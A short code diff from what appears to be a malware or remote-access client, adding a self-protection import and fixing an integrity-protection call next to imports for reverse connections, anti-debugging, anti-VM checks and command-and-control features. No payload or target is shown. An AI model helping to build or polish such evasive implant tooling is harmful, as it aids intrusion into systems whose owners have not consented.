@@ -23,6 +23,7 @@ from server_modules.reverse_connection import ReverseConnection
 from evasion_modules.mutex import check_single_instance, release_mutex
 from evasion_modules.anti_debug import check_debugging_environment
 from evasion_modules.anti_vm import check_virtual_environment
+from evasion_modules.self_protection import IntegrityProtection
 
 # Import new advanced features
 try:
@@ -307,7 +308,7 @@ def main(skip_checks: bool = False, skip_multi_stage: bool = False):
         initialize_c2_features()
 
         #Start integrity protection
-        pretection = IntegrityProtector.start_protection(enable_continuous_monitoring=True)
+        integrity_protection = IntegrityProtection(enable_continuous_monitoring=True)
         
         # Print startup banner
         print_banner()
